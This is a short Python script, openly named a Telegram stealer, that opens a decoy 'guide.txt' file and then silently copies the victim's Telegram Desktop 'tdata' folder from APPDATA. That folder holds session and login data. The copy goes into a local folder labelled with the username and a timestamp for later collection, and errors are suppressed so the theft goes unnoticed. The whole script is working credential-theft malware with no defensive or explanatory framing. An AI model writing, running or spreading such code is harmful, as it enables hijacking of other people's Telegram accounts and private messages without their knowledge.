import os
import shutil
import time

local_app_data = os.getenv('APPDATA')
path_telegram = local_app_data + '\Telegram Desktop'

true_cwd = os.getcwd()

os.startfile('my_own_info\guide.txt')


def telegram_stealer():
    os.chdir(path_telegram)
    try:
        shutil.copytree(os.getcwd() + r'\tdata',
                        true_cwd + rf'\приват\мое\не надо сюда идти\{os.getenv("USERNAME")}+'
                                   rf'{time.strftime("%d.%m.%Y.slash%H.%M.%S")}\tdata')
    except:
        pass


if os.access(path_telegram, mode=os.F_OK) is True:
    telegram_stealer()
